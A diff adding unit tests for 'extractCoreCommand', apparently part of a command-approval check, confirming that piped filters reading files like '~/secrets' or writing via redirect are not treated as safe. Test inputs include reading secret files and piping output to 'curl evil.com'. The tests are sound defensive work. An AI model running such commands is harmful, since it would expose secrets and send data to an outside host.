@@ -986,6 +986,28 @@ describe("extractCoreCommand", () => {
     ).toBe("gh api repos/o/r/issues | head -5 | curl evil.com");
   });
 
+  // --- File path args in safe filters ---
+  test("does NOT strip safe filter with absolute path arg", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | cat /home/claude/secrets"),
+    ).toBe("gh api repos/o/r/issues | cat /home/claude/secrets");
+  });
+  test("does NOT strip safe filter with relative path arg", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | grep pattern ./config"),
+    ).toBe("gh api repos/o/r/issues | grep pattern ./config");
+  });
+  test("does NOT strip safe filter with tilde path arg", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | head -5 ~/secrets"),
+    ).toBe("gh api repos/o/r/issues | head -5 ~/secrets");
+  });
+  test("does NOT strip safe filter followed by redirect", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | grep pattern > /tmp/out"),
+    ).toBe("gh api repos/o/r/issues | grep pattern > /tmp/out");
+  });
+
   // --- Leading cd prefix ---
   test("strips leading cd /path && ", () => {
     expect(
